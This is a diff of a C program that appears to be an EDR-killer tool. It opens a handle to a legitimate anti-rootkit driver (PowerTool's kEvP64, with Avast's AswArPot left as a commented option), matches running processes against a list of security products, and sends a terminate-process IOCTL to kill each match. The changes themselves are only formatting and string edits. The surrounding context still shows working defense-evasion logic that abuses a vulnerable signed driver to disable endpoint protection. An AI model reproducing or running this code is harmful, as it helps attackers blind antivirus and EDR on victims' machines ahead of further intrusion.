@@ -8,7 +8,7 @@
 #define IOCTL_TERMINATE_PROCESS 0x222034
 
 // AswArPot.sys - anti-rootkit driver by Avast
-//#define IOCTL_TERMINATE_PROCESS 0x9988c094
+// #define IOCTL_TERMINATE_PROCESS 0x9988c094
 
 const char* g_serviceName = "sys-mon";
 
@@ -126,8 +126,7 @@ int isInavEdrlist(const char* pn) {
 	return (0);
 }
 
-DWORD
-checkEDRProcesses(HANDLE hDevice) {
+DWORD checkEDRProcesses(HANDLE hDevice) {
 	unsigned int procId = 0;
 	unsigned int pOutbuff = 0;
 	DWORD bytesRet = 0;
@@ -146,7 +145,7 @@ checkEDRProcesses(HANDLE hDevice) {
 				if (isInavEdrlist(exeName)) {
 					procId = (unsigned int)pE.th32ProcessID;
 					if (!DeviceIoControl(hDevice, IOCTL_TERMINATE_PROCESS, &procId, sizeof(procId), &pOutbuff, sizeof(pOutbuff), &bytesRet, NULL))
-						printf("failed to terminate %ws !!\n", pE.szExeFile);
+						printf("failed to terminate %ws !!!\n", pE.szExeFile);
 					else {
 						printf("terminated %ws\n", pE.szExeFile);
 						ecount++;
@@ -190,13 +189,13 @@ int main(void) {
 	printf("driver loaded.\n");
 
 	// kEvP64.sys - anti-virus & anti-rootkit driver by PowerTool
-	HANDLE hDevice = CreateFileA("\\\\.\\KevP64", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-	
+	HANDLE hDevice = CreateFile(L"\\\\.\\KevP64", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
 	// AswArPot.sys - anti-rootkit driver by Avast
-	// HANDLE hDevice = CreateFileA("\\\\.\\aswSP_Avar", GENERIC_WRITE|GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	//HANDLE hDevice = CreateFile(L"\\\\.\\aswSP_Avar", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 
 	if (hDevice == INVALID_HANDLE_VALUE) {
-		printf("Failed to open handle to the driver!!! ");
+		printf("Failed to open handle to the driver!!!");
 		return (-1);
 	}
 
@@ -217,3 +216,4 @@ int main(void) {
 
 	return 0;
 }
+
